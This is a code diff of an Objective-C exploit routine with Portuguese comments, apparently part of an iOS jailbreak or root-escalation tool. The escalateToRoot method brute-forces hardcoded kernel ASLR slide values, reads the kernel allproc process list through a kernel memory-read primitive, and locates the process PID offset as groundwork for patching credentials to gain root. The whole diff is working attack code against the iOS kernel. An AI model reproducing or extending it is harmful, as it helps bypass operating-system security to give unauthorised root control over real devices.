@@ -112,43 +112,37 @@ extern char **environ;
 }
 
 - (BOOL)escalateToRoot {
-    [self logToWeb:@"🚀 Verificando Primitivas..."];
+    [self logToWeb:@"🔍 Buscando Slide Real (A13)..."];
     
-    // 1. Testa se a leitura básica funciona (Sanity Check)
-    uint64_t test = [self kread64:KERN_BASE_STATIC];
-    if (test == 0) {
-        [self logToWeb:@"❌ Erro: Leitura de Kernel bloqueada (SandBox)."];
-        return NO;
+    // Slides comuns para a build 26.3 (múltiplos de 0x200000)
+    uint64_t testes[] = {0x1CC00000, 0x1E400000, 0x20200000, 0x18400000, 0x21000000};
+    uint64_t allproc_offset = 0x8F50000ULL;
+    uint64_t proc = 0;
+
+    for (int i = 0; i < 5; i++) {
+        uint64_t ptr = (0xFFFFFFF007004000ULL + testes[i] + allproc_offset);
+        proc = [self kread64:ptr];
+        
+        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
+            [self logToWeb:[NSString stringWithFormat:@"🎯 SLIDE ACHADO: 0x%llx", testes[i]]];
+            _kernelSlide = testes[i];
+            break;
+        }
     }
-
-    uint64_t slide = [self leakKernelSlide];
-    [self logToWeb:[NSString stringWithFormat:@"🔍 Slide: 0x%llx", slide]];
-
-    // 2. Scanner de AllProc (iOS 26.3)
-    uint64_t allproc_offset = 0x8F50000ULL; 
-    uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + slide + allproc_offset);
-    uint64_t proc = [self kread64:allproc_ptr];
 
     if (proc == 0) {
-        [self logToWeb:@"❌ Erro: AllProc 0x0. Offset ou Slide incorretos."];
+        [self logToWeb:@"❌ Erro: Todos os slides falharam."];
         return NO;
     }
 
-    // 3. TESTE FINAL: 0x60 ou 0x68?
-    // No A13 (iOS 19/26), o PID é 32-bit e fica em 0x68
-    uint32_t p60 = [self kread32:(proc + 0x60)];
+    // AGORA O SCAN DO PID VAI FUNCIONAR:
     uint32_t p68 = [self kread32:(proc + 0x68)];
-
-    [self logToWeb:[NSString stringWithFormat:@"📊 PID Scan: 0x60=%d | 0x68=%d", p60, p68]];
-
-    if (p68 == getpid()) {
-        [self logToWeb:@"✅ CONFIRMADO: PID Offset é 0x68"];
-        // Segue para o Patch de ucred...
-        return YES;
-    }
+    [self logToWeb:[NSString stringWithFormat:@"📊 PID em 0x68: %d", p68]];
     
-    return NO;
+    return (p68 == getpid());
 }
+
+
 - (void)logToWeb:(NSString *)text {
     NSLog(@"[KERNEL] %@", text);
     dispatch_async(dispatch_get_main_queue(), ^{
